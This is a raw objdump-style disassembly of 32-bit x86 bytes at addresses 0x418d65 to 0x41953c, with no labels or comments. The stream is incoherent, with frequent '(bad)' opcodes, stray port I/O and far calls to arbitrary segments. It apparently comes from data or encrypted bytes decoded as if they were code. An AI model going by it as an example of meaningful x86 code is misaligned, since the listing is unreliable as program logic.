  418d65:	(bad)  
  418d66:	fcmovnu st,st(3)
  418d68:	sub    DWORD PTR [edx-0x4b41538f],esi
  418d6e:	sbb    DWORD PTR ds:0x506811fe,esi
  418d74:	data16 mov al,0xf5
  418d77:	inc    DWORD PTR [edx-0x4d1df69b]
  418d7d:	cmc    
  418d7e:	repz pusha 
  418d80:	dec    esp
  418d81:	sahf   
  418d82:	mov    esp,0x90120c7
  418d87:	inc    eax
  418d88:	xchg   esi,eax
  418d89:	retf   0xbe54
  418d8c:	fs inc ecx
  418d8e:	(bad)  
  418d8f:	idiv   ch
  418d91:	fnstsw WORD PTR ds:[edx+0x50]
  418d95:	xor    al,0xda
  418d97:	jp     0x418d65
  418d99:	vmovhpd xmm4,xmm0,xmm1
  418d9d:	sub    al,0x4e
  418d9f:	cli    
  418da0:	mov    eax,0x2582aeb2
  418da5:	pop    edi
  418da6:	push   0xffffffe0
  418da8:	mov    cs,WORD PTR [edx-0x18c8ff93]
  418dae:	push   eax
  418daf:	in     eax,dx
  418db0:	in     al,0xfa
  418db2:	lods   eax,DWORD PTR ds:[esi]
  418db3:	fs test al,0x2e
  418db6:	sub    eax,DWORD PTR ds:0x20ce4b26
  418dbc:	mov    esp,0xc44b182
  418dc1:	mov    BYTE PTR [esi],dl
  418dc3:	pop    eax
  418dc4:	inc    esp
  418dc5:	dec    ebx
  418dc6:	ss lahf 
  418dc8:	out    0xc6,al
  418dca:	call   0xd1c7:0xcb5acc86
  418dd1:	gs mov ebp,0x110e98e1
  418dd7:	(bad)  
  418dd8:	jo     0x418d62
  418dda:	jae    0x418d9e
  418ddc:	and    DWORD PTR [edx+0x68b834fc],edx
  418de2:	test   al,0xe6
  418de4:	mov    dh,0x6f
  418de6:	inc    ebp
  418de7:	imul   edx,DWORD PTR [edx+0x1eb66cde],0xfffffffc
  418dee:	imul   esi,DWORD PTR [esi-0x59f8a261],0x6f
  418df5:	rcr    BYTE PTR [edx],cl
  418df7:	sub    eax,ecx
  418df9:	nop
  418dfa:	inc    edi
  418dfb:	dec    edi
  418dfc:	arpl   WORD PTR fs:0x8c68f4c6,di
  418e03:	xlat   BYTE PTR ds:[ebx]
  418e04:	xor    BYTE PTR [ecx],bh
  418e06:	in     al,0x34
  418e08:	nop
  418e09:	dec    ebx
  418e0a:	sbb    DWORD PTR [edi-0x51],eax
  418e0d:	stos   DWORD PTR es:[edi],eax
  418e0e:	jge    0x418dc4
  418e10:	mov    WORD PTR [esi-0x25],?
  418e13:	ss dec eax
  418e15:	retf   
  418e16:	lds    ecx,FWORD PTR [ebp-0x79]
  418e19:	jl     0x418e8c
  418e1b:	sbb    BYTE PTR [eax-0x79],al
  418e1e:	push   0x6d
  418e20:	test   eax,0xf0c80e8d
  418e25:	xor    dl,BYTE PTR ds:0xd3d21120
  418e2b:	sti    
  418e2c:	not    DWORD PTR [ebp+edx*2+0x31]
  418e30:	imul   dh
  418e32:	add    al,0x51
  418e34:	inc    esi
  418e35:	mov    eax,ds:0xe34a2878
  418e3a:	fisttp QWORD PTR [ebx]
  418e3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e3d:	jae    0x418e0f
  418e3f:	inc    si
  418e41:	lock mov eax,0xc1906471
  418e47:	ins    DWORD PTR es:[edi],dx
  418e48:	mov    ebx,0x8ece862f
  418e4d:	aad    0x89
  418e4f:	test   BYTE PTR [ecx+0x6b],dl
  418e52:	cmp    eax,0x80ddd2bb
  418e57:	xor    eax,0x262cd675
  418e5c:	dec    edx
  418e5d:	pop    ds
  418e5e:	xchg   DWORD PTR [edi+edi*1+0x478caa5f],edx
  418e65:	js     0x418e8a
  418e67:	adc    al,0xdd
  418e69:	push   0xb7a6331b
  418e6e:	les    eax,FWORD PTR [ecx-0x20]
  418e71:	stos   DWORD PTR es:[edi],eax
  418e72:	mov    bl,0xe0
  418e74:	push   cs
  418e75:	cmp    al,0xf5
  418e77:	dec    eax
  418e78:	add    eax,0x9f006dc0
  418e7d:	dec    eax
  418e7e:	shl    esp,1
  418e80:	adc    BYTE PTR [edx-0x58],ch
  418e83:	mov    BYTE PTR ds:0x28181e64,ch
  418e89:	out    0x59,al
  418e8b:	jge    0x418e4b
  418e8d:	sbb    eax,0xb9268770
  418e92:	push   edx
  418e93:	jns    0x418e40
  418e95:	inc    ebx
  418e96:	pop    edx
  418e97:	je     0x418ed2
  418e99:	inc    eax
  418e9a:	mov    eax,ds:0xd67f92bc
  418e9f:	jbe    0x418efe
  418ea1:	add    eax,0xcd8ee115
  418ea6:	push   esi
  418ea7:	dec    ecx
  418ea8:	lods   al,BYTE PTR ds:[esi]
  418ea9:	ins    BYTE PTR es:[edi],dx
  418eaa:	jns    0x418ef1
  418eac:	mov    eax,ds:0x3bba1cb4
  418eb1:	in     eax,dx
  418eb2:	and    BYTE PTR [esi-0x4a6f33be],0x62
  418eb9:	scas   al,BYTE PTR es:[edi]
  418eba:	sub    DWORD PTR [ebp-0x24],edi
  418ebd:	mov    ds:0x4f11e85f,al
  418ec2:	dec    edi
  418ec3:	outs   dx,DWORD PTR ds:[esi]
  418ec4:	pop    edx
  418ec5:	push   es
  418ec6:	inc    edx
  418ec7:	lods   eax,DWORD PTR ds:[esi]
  418ec8:	dec    ecx
  418ec9:	inc    eax
  418eca:	cmp    ch,ah
  418ecc:	push   ecx
  418ecd:	dec    esp
  418ece:	and    al,0xda
  418ed0:	gs (bad) 
  418ed2:	mov    es,WORD PTR [eax-0x7cceecb9]
  418ed8:	sbb    BYTE PTR [edi+0x78],al
  418edb:	shl    DWORD PTR [ebx-0x503a5c80],cl
  418ee1:	pop    ss
  418ee2:	pushf  
  418ee3:	xor    DWORD PTR [edx-0x3d32ffcb],esi
  418ee9:	stos   DWORD PTR es:[edi],eax
  418eea:	loop   0x418ee1
  418eec:	in     al,0xfe
  418eee:	fcomi  st,st(7)
  418ef0:	xor    cl,BYTE PTR [ebp+0x8]
  418ef3:	pusha  
  418ef4:	or     BYTE PTR [esi+0x2f],bl
  418ef7:	in     al,dx
  418ef8:	sbb    ch,BYTE PTR [edx]
  418efa:	xchg   DWORD PTR ds:0xa51a54e6,ebp
  418f00:	mov    bh,0xcd
  418f02:	aam    0x23
  418f04:	cs push cs
  418f06:	cmp    bl,BYTE PTR [ebp+0x6a]
  418f09:	cmp    ah,bl
  418f0b:	call   0xd0f1:0x50171d0
  418f12:	outs   dx,DWORD PTR ds:[esi]
  418f13:	repnz push ss
  418f15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f16:	fdivr  st(6),st
  418f18:	popa   
  418f19:	pop    ds
  418f1a:	out    0xd4,eax
  418f1c:	xchg   ebx,eax
  418f1d:	repz xor eax,0x5dc003fb
  418f23:	lods   eax,DWORD PTR ds:[esi]
  418f24:	dec    ecx
  418f25:	(bad)  
  418f27:	mov    cl,0xfc
  418f29:	(bad)
  418f2c:	jb     0x418f5b
  418f2e:	(bad)  
  418f30:	rcl    DWORD PTR [eax],cl
  418f32:	das    
  418f33:	mov    edi,0xf7cada10
  418f38:	ins    DWORD PTR es:[edi],dx
  418f39:	pop    ds
  418f3a:	call   0xc176:0xbff48277
  418f41:	sbb    al,0x62
  418f43:	mov    al,ds:0x8b28e4dc
  418f49:	fidivr WORD PTR [esi]
  418f4b:	data16 or al,0xb8
  418f4e:	data16 rcl cl,0xe3
  418f52:	xlat   BYTE PTR ds:[ebx]
  418f53:	xchg   edx,eax
  418f54:	arpl   bp,bp
  418f56:	xchg   esi,edi
  418f58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f59:	push   ss
  418f5a:	lahf   
  418f5b:	cs mov dl,0x4b
  418f5e:	inc    edx
  418f5f:	mov    ebp,0x29ee97bc
  418f64:	mov    al,ds:0xbf895ab8
  418f69:	xlat   BYTE PTR ds:[ebx]
  418f6a:	sub    ah,BYTE PTR [ebx]
  418f6c:	lea    ecx,[ebx-0x40]
  418f6f:	jmp    0xf3f8768d
  418f74:	jecxz  0x418faf
  418f76:	cmp    eax,0xfedc96e4
  418f7b:	inc    ecx
  418f7c:	push   ss
  418f7d:	mov    ch,0x10
  418f7f:	test   eax,0x3404b5f1
  418f84:	xchg   esi,eax
  418f85:	psubb  mm0,QWORD PTR [edi+0x664330af]
  418f8c:	dec    ebp
  418f8d:	idiv   ah
  418f8f:	push   eax
  418f90:	call   0xb254:0xf499cbb4
  418f97:	shr    BYTE PTR [ecx-0x40],cl
  418f9a:	sub    eax,0x4f146b1c
  418f9f:	icebp  
  418fa0:	pushf  
  418fa1:	adc    dh,BYTE PTR cs:[eax-0x59]
  418fa5:	lea    ebp,[ecx-0xd]
  418fa8:	xor    ebp,DWORD PTR ds:0x6086ac61
  418fae:	cli    
  418faf:	xchg   ebp,eax
  418fb0:	adc    eax,0x754036ce
  418fb5:	pop    ds
  418fb6:	aas    
  418fb7:	push   ebx
  418fb8:	cld    
  418fb9:	mov    ds:0xbcbdc22d,eax
  418fbe:	pop    ss
  418fbf:	pop    ecx
  418fc0:	inc    eax
  418fc1:	dec    eax
  418fc2:	sub    ax,0xcaf3
  418fc6:	les    edi,FWORD PTR [edi-0x75]
  418fc9:	cmp    DWORD PTR [edx-0xe],ecx
  418fcc:	ja     0xa2024b8f
  418fd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418fd3:	nop
  418fd4:	pop    esp
  418fd5:	xor    esp,DWORD PTR [ecx+0x4e]
  418fd8:	in     al,0x4b
  418fda:	lods   al,BYTE PTR ds:[esi]
  418fdb:	xor    al,0x2f
  418fdd:	push   ds
  418fde:	push   ebp
  418fdf:	imul   ebx,ebp,0xffffffd2
  418fe2:	mov    dh,0x9
  418fe4:	loopne 0x418f8f
  418fe6:	mov    cl,0x75
  418fe8:	bound  ebp,QWORD PTR [edx]
  418fea:	jmp    0x41900b
  418fec:	push   ds
  418fed:	mov    dl,0x70
  418fef:	ja     0x418fd7
  418ff1:	jbe    0x419041
  418ff3:	sbb    edi,DWORD PTR [edx-0x4]
  418ff6:	push   esp
  418ff7:	mov    eax,ecx
  418ff9:	je     0x41901d
  418ffb:	lahf   
  418ffc:	jae    0x419042
  418ffe:	jmp    0x68ee:0x1cd01650
  419005:	sbb    ah,bl
  419007:	push   ss
  419008:	std    
  419009:	in     al,0x85
  41900b:	pusha  
  41900c:	xor    BYTE PTR [ebx-0x46],al
  41900f:	mov    DWORD PTR [ebp+0x1e],eax
  419012:	jge    0x418fc3
  419014:	push   es
  419015:	xor    bl,BYTE PTR [edx+0x66ad4dc7]
  41901b:	mov    eax,ds:0xe11963e6
  419020:	imul   esp,DWORD PTR [edx],0xffffffc3
  419023:	vpshlw xmm14,[esi],xmm6
  419028:	ret    
  419029:	add    al,BYTE PTR [edx-0x4baa248]
  41902f:	jmp    0xfc2b:0x5b0186ee
  419036:	sub    BYTE PTR [edx],bl
  419038:	and    eax,0x21370e5
  41903d:	xchg   ecx,eax
  41903e:	pop    eax
  41903f:	push   es
  419040:	dec    esi
  419041:	and    DWORD PTR [edi+0x2f],edx
  419044:	shl    BYTE PTR fs:[esi],cl
  419047:	fisttp WORD PTR [eax+0x71]
  41904a:	scas   ax,WORD PTR es:[edi]
  41904c:	mov    DWORD PTR [eax-0x54d16a11],edx
  419052:	mov    ecx,DWORD PTR [ebx-0x66327f87]
  419058:	fldenv [eax+0x4f]
  41905b:	rol    ecx,cl
  41905d:	popa   
  41905e:	out    dx,al
  41905f:	mov    eax,0x9e892233
  419064:	in     al,0x88
  419066:	sbb    ebp,DWORD PTR [ebp+0x5c7b3487]
  41906c:	aam    0x58
  41906e:	inc    esp
  41906f:	xor    dl,BYTE PTR [ebx+eax*2+0x1]
  419073:	add    edi,DWORD PTR [edx]
  419075:	retf   
  419076:	xor    al,0xc7
  419078:	jnp    0x41904e
  41907a:	(bad)  
  41907b:	jmp    0x419015
  41907d:	push   ecx
  41907e:	and    BYTE PTR [edx],dl
  419080:	mov    cs,ebp
  419082:	jge    0x419008
  419084:	retf   
  419085:	mov    ah,0x8a
  419087:	popa   
  419088:	outs   dx,DWORD PTR ds:[esi]
  419089:	rcr    DWORD PTR [esi+esi*8],0x1a
  41908d:	pop    ecx
  41908e:	stc    
  41908f:	ins    BYTE PTR es:[edi],dx
  419090:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419091:	(bad)
  419095:	push   ds
  419096:	cdq    
  419097:	push   0x58
  419099:	sbb    eax,0x51752f70
  41909e:	popa   
  41909f:	ja     0x41907d
  4190a1:	je     0x4190aa
  4190a3:	cmp    ecx,DWORD PTR [ecx]
  4190a5:	push   ecx
  4190a6:	adc    DWORD PTR [edi+0xa],0x95300526
  4190ad:	pusha  
  4190ae:	jl     0x4190cf
  4190b0:	push   ecx
  4190b1:	add    cl,cl
  4190b3:	(bad)  
  4190b4:	xchg   esi,eax
  4190b5:	pop    ebp
  4190b6:	and    BYTE PTR [esi+ecx*4],al
  4190b9:	rcl    DWORD PTR [esi+0x65695d19],0x92
  4190c0:	mov    DWORD PTR [eax],0x44bc8d1
  4190c6:	jge    0x419124
  4190c8:	fisttp DWORD PTR [esp+esi*4+0x2c42478e]
  4190cf:	adc    eax,0x3683904a
  4190d4:	push   edx
  4190d5:	cmp    bl,BYTE PTR [ebx]
  4190d7:	std    
  4190d8:	(bad)  
  4190d9:	xchg   edi,ebx
  4190db:	dec    ebx
  4190dc:	pop    ebp
  4190dd:	mov    BYTE PTR [ebp-0x203ab1dd],0x9d
  4190e4:	sub    al,0xeb
  4190e6:	mov    bh,0x2f
  4190e8:	pusha  
  4190e9:	adc    eax,0x7be5af75
  4190ee:	dec    edx
  4190ef:	mov    eax,ds:0x74bb6353
  4190f4:	dec    esi
  4190f5:	inc    ecx
  4190f6:	add    al,0x9b
  4190f8:	sar    BYTE PTR [edi-0x1d],0x5f
  4190fc:	pop    es
  4190fd:	mov    ecx,0xabb3373b
  419102:	inc    eax
  419103:	in     eax,dx
  419104:	call   FWORD PTR [eax]
  419106:	xor    BYTE PTR [ebx],bh
  419108:	sub    eax,0x4085af1e
  41910d:	leave  
  41910e:	jmp    0x7518:0xae2794e
  419115:	add    DWORD PTR [edi+0x13],ebp
  419118:	fsub   QWORD PTR [ebx]
  41911a:	imul   esi,DWORD PTR [edx+0x40],0x79e78263
  419121:	fidiv  WORD PTR [eax+0x4b]
  419124:	ror    BYTE PTR [ebx+0x4baf92ae],1
  41912a:	sub    BYTE PTR [esi-0x7fd3a5ed],ah
  419130:	mov    ecx,DWORD PTR [ebp+0x7eba4908]
  419136:	fld    TBYTE PTR [ebp+0x54aabae5]
  41913c:	adc    DWORD PTR [ecx+0x48e814ea],0x64
  419143:	call   0x8ba0:0xddcc047a
  41914a:	mov    gs,WORD PTR [esi+0x45]
  41914d:	aam    0x46
  41914f:	dec    ecx
  419150:	xlat   BYTE PTR ds:[ebx]
  419151:	enter  0x794c,0x6c
  419155:	xchg   esi,eax
  419156:	xchg   ebx,eax
  419157:	stos   DWORD PTR es:[edi],eax
  419158:	pop    esp
  419159:	push   ebx
  41915a:	and    eax,0x63f9bee0
  41915f:	xlat   BYTE PTR ds:[ebx]
  419160:	sbb    cl,BYTE PTR [ebp+0x199a01d8]
  419166:	ins    DWORD PTR es:[edi],dx
  419167:	add    al,bh
  419169:	aad    0xc0
  41916b:	lahf   
  41916c:	retf   0x7f32
  41916f:	pusha  
  419170:	dec    ebp
  419171:	cmp    DWORD PTR [eax],esi
  419173:	(bad)  
  419174:	stc    
  419175:	gs mul ebx
  419178:	and    bh,dl
  41917a:	js     0x4191c2
  41917c:	aad    0x47
  41917e:	das    
  41917f:	mov    ds:0x71e93231,eax
  419184:	ins    BYTE PTR es:[edi],dx
  419185:	xor    esi,esi
  419187:	jmp    0x495e7989
  41918c:	call   0x66af:0x9e1bcd4
  419193:	cmp    esi,eax
  419195:	xchg   ebp,eax
  419196:	out    dx,eax
  419197:	shl    BYTE PTR ds:[ebp-0x39c82f75],cl
  41919e:	popf   
  41919f:	call   0xc4e7a790
  4191a4:	call   0x624650a6
  4191a9:	pop    esp
  4191aa:	arpl   WORD PTR [ebx+ebp*2+0x34952e35],si
  4191b1:	out    0xc1,eax
  4191b3:	inc    edi
  4191b4:	data16 sti 
  4191b6:	scas   al,BYTE PTR es:[edi]
  4191b7:	dec    eax
  4191b8:	jns    0x4191e2
  4191ba:	jae    0x419187
  4191bc:	inc    edi
  4191bd:	stc    
  4191be:	mov    bl,0x8d
  4191c0:	push   edi
  4191c1:	jns    0x419212
  4191c3:	sbb    al,0xc8
  4191c5:	mov    dh,0x16
  4191c7:	fmul   st(6),st
  4191c9:	lahf   
  4191ca:	adc    eax,ebp
  4191cc:	in     eax,0x19
  4191ce:	rol    BYTE PTR [edx+0x6f8859ee],0x4b
  4191d5:	(bad)  
  4191d6:	stos   BYTE PTR es:[edi],al
  4191d7:	sub    ch,BYTE PTR [ecx+0x7b]
  4191da:	fnstenv [eax+0x99a036f]
  4191e0:	ss push ds
  4191e2:	js     0x419254
  4191e4:	lahf   
  4191e5:	scas   al,BYTE PTR es:[edi]
  4191e6:	cmp    al,0x7d
  4191e8:	fstp   QWORD PTR [esi-0x60]
  4191eb:	hlt    
  4191ec:	dec    esi
  4191ed:	fild   WORD PTR [esi]
  4191ef:	(bad)  [ebx+eax*4-0x3f0992ac]
  4191f6:	stos   BYTE PTR es:[edi],al
  4191f7:	xor    ecx,DWORD PTR [edx+0x4f51c7a8]
  4191fd:	imul   ebp,DWORD PTR [ebx],0xffffffcc
  419200:	fwait
  419201:	(bad)  
  419202:	push   esp
  419203:	clc    
  419204:	test   eax,0xffd845fc
  419209:	push   0x89054db3
  41920e:	push   ebp
  41920f:	in     eax,0x9a
  419211:	cmp    al,0x29
  419213:	es pop ds
  419215:	mov    ds:0xf89a8a2e,eax
  41921a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41921b:	repz push cs
  41921d:	aam    0x4b
  41921f:	fist   WORD PTR cs:[esi+0x2]
  419223:	ret    
  419224:	mov    cs,WORD PTR [esi+0x4d]
  419227:	and    DWORD PTR [edx+0x97a79ca],ecx
  41922d:	fld    DWORD PTR [edx-0x39]
  419230:	cwde   
  419231:	push   es
  419232:	jno    0x419257
  419234:	dec    ebp
  419235:	cs add al,0x26
  419238:	mov    ds:0x3eb228c,al
  41923d:	lods   eax,DWORD PTR ds:[esi]
  41923e:	stos   DWORD PTR es:[edi],eax
  41923f:	popf   
  419240:	jns    0x419277
  419242:	jnp    0x419248
  419244:	enter  0xc09,0xab
  419248:	xor    DWORD PTR [edx],0xffffffbe
  41924b:	adc    BYTE PTR [ecx+ebp*2-0x3d9a61a2],ch
  419252:	pop    es
  419253:	je     0x419228
  419255:	int    0x52
  419257:	imul   eax,esp,0x5bb675bf
  41925d:	data16 xlat BYTE PTR fs:[ebx]
  419260:	sub    eax,0xf4f8b7da
  419265:	imul   ebp,DWORD PTR [edi],0xffffffd2
  419268:	cmp    al,0xc9
  41926a:	pop    esi
  41926b:	mov    dh,0x80
  41926d:	fcmovnu st,st(4)
  41926f:	pusha  
  419270:	loopne 0x419213
  419272:	fs in  eax,dx
  419274:	adc    dl,BYTE PTR [edi]
  419276:	sub    DWORD PTR [eax],edx
  419278:	push   0x51
  41927a:	adc    eax,0x3428308b
  41927f:	loope  0x41926f
  419281:	jb     0x4192d8
  419283:	ret    0x67c2
  419286:	shl    BYTE PTR [edx-0x1e],0xf0
  41928a:	xor    eax,0xeddee5a9
  41928f:	hlt    
  419290:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419291:	hlt    
  419292:	mov    esi,0x2119e8c2
  419297:	mov    ds:0x35cd9f51,al
  41929c:	mov    al,0x48
  41929e:	jae    0x4192a8
  4192a0:	je     0x419270
  4192a2:	stos   BYTE PTR es:[edi],al
  4192a3:	adc    BYTE PTR [ecx+0x471e403],ch
  4192a9:	push   edx
  4192aa:	cmp    eax,0xebbc19cc
  4192af:	mov    edx,0x4424dc23
  4192b4:	adc    eax,0x8c16c700
  4192b9:	push   edx
  4192ba:	jg     0x419328
  4192bc:	sbb    al,0xf9
  4192be:	dec    ebp
  4192bf:	imul   DWORD PTR [edi]
  4192c1:	pop    ss
  4192c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4192c3:	xchg   esi,eax
  4192c4:	sar    DWORD PTR [esi],cl
  4192c6:	cmp    esi,DWORD PTR [edi]
  4192c8:	or     esi,DWORD PTR [edi-0x166d95aa]
  4192ce:	mul    BYTE PTR [eax-0x11]
  4192d1:	fsubr  DWORD PTR [esi+0x312b169d]
  4192d7:	pop    ecx
  4192d8:	sub    DWORD PTR [edx+edx*2-0x2f],0xb493010
  4192e0:	cmp    al,0x46
  4192e2:	push   ds
  4192e3:	mov    cs,WORD PTR [ecx-0xa]
  4192e6:	shl    DWORD PTR [ebx-0x389978a1],0x7
  4192ed:	pop    ss
  4192ee:	adc    esi,DWORD PTR [eax]
  4192f0:	pushf  
  4192f1:	jae    0x4192b0
  4192f3:	daa    
  4192f4:	cmp    edi,DWORD PTR [eax]
  4192f6:	rcl    BYTE PTR [ecx-0x7c],0x73
  4192fa:	pop    ebp
  4192fb:	xor    bh,BYTE PTR [eax]
  4192fd:	loope  0x41931e
  4192ff:	js     0x419367
  419301:	mov    eax,ds:0x8f670907
  419306:	jno    0x419373
  419308:	(bad)  ds:0xd7981ba7
  41930e:	stos   DWORD PTR es:[edi],eax
  41930f:	ss pop es
  419311:	mov    eax,ds:0x2b1ad5f7
  419316:	fstp   DWORD PTR [ebx]
  419318:	repnz mov cl,0xab
  41931b:	enter  0xdba9,0xb
  41931f:	shl    BYTE PTR [esi+0x23ad0389],0x86
  419326:	xor    esp,DWORD PTR [eax]
  419328:	cli    
  419329:	push   edi
  41932a:	sub    eax,0x174bb331
  41932f:	mov    esp,0x3e84c98a
  419334:	inc    ebx
  419335:	stos   BYTE PTR es:[edi],al
  419336:	scas   al,BYTE PTR es:[edi]
  419337:	add    ebp,0xffffffdc
  41933a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41933b:	xchg   esi,esi
  41933d:	pop    ecx
  41933e:	or     cl,BYTE PTR [edx+0x4ac401cc]
  419344:	aaa    
  419345:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419346:	retf   0xf883
  419349:	mov    bh,BYTE PTR [ebp-0x676025b6]
  41934f:	(bad)  
  419350:	ret    0xc2cd
  419353:	clc    
  419354:	aad    0x92
  419356:	sub    al,0x17
  419358:	shl    BYTE PTR [edx],cl
  41935a:	and    eax,0xda3a185f
  41935f:	mov    ch,0x19
  419361:	pusha  
  419362:	bound  ecx,QWORD PTR [eax-0x2d80ccf9]
  419368:	mov    esp,0xfa89d919
  41936d:	retf   
  41936e:	nop
  41936f:	fcomip st,st(4)
  419371:	pushf  
  419372:	add    ebx,DWORD PTR cs:0xa580c3b6
  419379:	div    DWORD PTR [eax]
  41937b:	aad    0x4a
  41937d:	jmp    0x419384
  41937f:	cmc    
  419380:	cmp    DWORD PTR [edi-0x518ccadd],ebx
  419386:	int    0x5a
  419388:	das    
  419389:	and    ecx,eax
  41938b:	push   ebx
  41938c:	push   ss
  41938d:	xchg   esi,eax
  41938e:	or     al,0xe6
  419390:	sbb    ebp,DWORD PTR [edx]
  419392:	xor    eax,0xebff8b15
  419397:	jae    0x419382
  419399:	outs   dx,DWORD PTR ds:[esi]
  41939a:	adc    DWORD PTR [eax+edx*4],edx
  41939d:	push   ebx
  41939e:	test   DWORD PTR [ebx+0x48],edx
  4193a1:	popa   
  4193a2:	test   eax,0x3ac5ee63
  4193a7:	mov    ds:0xb094fae5,eax
  4193ac:	fsubr  QWORD PTR [edi-0x3df8005e]
  4193b2:	(bad)  
  4193b4:	cmp    al,0xca
  4193b6:	jp     0x4193db
  4193b8:	jle    0x419406
  4193ba:	pop    esp
  4193bb:	pop    esi
  4193bc:	xchg   esp,eax
  4193bd:	iret   
  4193be:	pop    esi
  4193bf:	aaa    
  4193c0:	or     al,0x8
  4193c2:	cmc    
  4193c3:	mov    DWORD PTR [ecx+0x4f],ecx
  4193c6:	add    DWORD PTR [ecx],esi
  4193c8:	iret   
  4193c9:	std    
  4193ca:	add    al,0xb2
  4193cc:	adc    esi,DWORD PTR [edi-0x142a9533]
  4193d2:	sub    eax,0x9afcef7e
  4193d7:	mov    esi,0x52a1fb54
  4193dc:	push   es
  4193dd:	mov    ebp,0x3231631d
  4193e2:	lock dec DWORD PTR [edx-0x63]
  4193e6:	jno    0x4193b9
  4193e8:	aaa    
  4193e9:	or     al,BYTE PTR [ecx-0x40]
  4193ec:	mov    gs,WORD PTR [edi-0x7425830a]
  4193f2:	bound  ecx,QWORD PTR [ecx-0x7f]
  4193f5:	mov    esi,esi
  4193f7:	pop    ecx
  4193f8:	out    0xc0,eax
  4193fa:	cdq    
  4193fb:	pusha  
  4193fc:	mov    ebx,0xfa97f711
  419401:	repz jmp 0x620e2e81
  419407:	pop    edx
  419408:	sub    BYTE PTR [esi+0x5f4dba5f],dh
  41940e:	stos   DWORD PTR es:[edi],eax
  41940f:	(bad)  
  419410:	mov    cl,BYTE PTR [esi+0x6d318cda]
  419416:	retf   0xa456
  419419:	xor    al,0x25
  41941b:	sbb    al,BYTE PTR [ecx-0x18c7c58d]
  419421:	pusha  
  419422:	jno    0x4193ff
  419424:	imul   edx,DWORD PTR [ebx+0xe0f0695],0x33
  41942b:	mov    esp,0xae8a3a77
  419430:	jecxz  0x41946a
  419432:	cmp    ebx,DWORD PTR [ecx]
  419434:	cdq    
  419435:	mov    cl,0x39
  419437:	pop    esp
  419438:	push   ebp
  419439:	jle    0x419463
  41943b:	xchg   edx,eax
  41943c:	mov    DWORD PTR [ebx-0x1b],esi
  41943f:	jp     0x41949b
  419441:	or     dh,BYTE PTR [esi]
  419443:	fstp   TBYTE PTR [ebx+ecx*2-0x41345e79]
  41944a:	aaa    
  41944b:	clc    
  41944c:	xlat   BYTE PTR ds:[ebx]
  41944d:	xor    BYTE PTR [esi+0xf],al
  419450:	jecxz  0x4193e3
  419452:	fbstp  TBYTE PTR [edx+ebx*2]
  419455:	mov    dl,0x6
  419457:	and    ah,BYTE PTR [esi+0x22]
  41945a:	data16 cld 
  41945c:	jecxz  0x4194a5
  41945e:	test   al,0x4b
  419460:	cld    
  419461:	sbb    al,0xc2
  419463:	push   edi
  419464:	ret    0x4fcc
  419467:	dec    edi
  419468:	in     al,0x44
  41946a:	out    dx,eax
  41946b:	fs push esi
  41946d:	aaa    
  41946e:	add    dh,BYTE PTR [ebp+ebp*8+0x67ae673]
  419475:	or     eax,0xc161a518
  41947a:	ror    DWORD PTR [edx+0x6733bf6d],1
  419480:	or     esp,DWORD PTR ds:[ecx-0x3f5cf50]
  419487:	mov    eax,ds:0x842aef27
  41948c:	(bad)  
  41948d:	xchg   ecx,eax
  41948e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41948f:	shr    DWORD PTR [edx-0x6b],cl
  419492:	and    eax,0xb4a0951b
  419497:	(bad)  
  419498:	(bad)  
  419499:	ss in  eax,dx
  41949b:	data16 ficom WORD PTR [esi]
  41949e:	jns    0x41946a
  4194a0:	int    0x99
  4194a2:	inc    esp
  4194a3:	xchg   esi,eax
  4194a4:	inc    ecx
  4194a5:	ss xor al,0xb5
  4194a8:	sub    BYTE PTR [edi-0x7a],bl
  4194ab:	sbb    esp,esp
  4194ad:	xor    eax,0x9f7b3533
  4194b2:	mov    ds:0x7f131bf2,eax
  4194b7:	mov    edx,0xb8242152
  4194bc:	cli    
  4194bd:	aas    
  4194be:	mov    dl,0x1
  4194c0:	rcr    DWORD PTR [eax-0x11],1
  4194c3:	xor    dl,BYTE PTR [edx-0x68]
  4194c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4194c7:	jmp    0x4194fc
  4194c9:	lods   eax,DWORD PTR ds:[esi]
  4194ca:	mov    dl,BYTE PTR [eax]
  4194cc:	push   edi
  4194cd:	mov    ebx,DWORD PTR [ebp+0x34]
  4194d0:	sub    eax,0x87a34f74
  4194d5:	or     ch,bh
  4194d7:	test   al,0xe
  4194d9:	leave  
  4194da:	and    bh,BYTE PTR [edi+0x7d]
  4194dd:	adc    DWORD PTR [esi+0x56],esp
  4194e0:	jl     0x419497
  4194e2:	add    DWORD PTR [eax],edi
  4194e4:	js     0x41947e
  4194e6:	leave  
  4194e7:	shr    DWORD PTR [edi+0x18cd5eb2],1
  4194ed:	or     ch,BYTE PTR [esi-0x18cb3ffa]
  4194f3:	into   
  4194f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4194f5:	test   BYTE PTR [edx+0xc287fd5],dh
  4194fb:	lea    eax,[ebp-0x3d]
  4194fe:	popf   
  4194ff:	mov    dl,0xd6
  419501:	ins    BYTE PTR es:[edi],dx
  419502:	jle    0x419542
  419504:	pop    ds
  419505:	fadd   QWORD PTR [esi+0x1cf13b2a]
  41950b:	jmp    0x4194fe
  41950d:	cs popa 
  41950f:	cwde   
  419510:	enter  0x3014,0x82
  419514:	mov    bh,0xad
  419516:	aam    0xa5
  419518:	fmul   DWORD PTR [ecx+0x55]
  41951b:	mov    dl,0x34
  41951d:	inc    eax
  41951e:	ror    BYTE PTR [ecx+ebp*4+0x333c1c7c],1
  419525:	sub    al,ch
  419527:	(bad)
  41952a:	pop    edx
  41952b:	xlat   BYTE PTR ds:[ebx]
  41952c:	ja     0x419510
  41952e:	pop    ss
  41952f:	dec    ecx
  419530:	sub    al,0xfa
  419532:	push   es
  419533:	rcr    BYTE PTR [edx+0x161e8f86],cl
  419539:	ins    BYTE PTR es:[edi],dx
  41953a:	fucomip st,st(7)
  41953c:	jg     0x4195b6
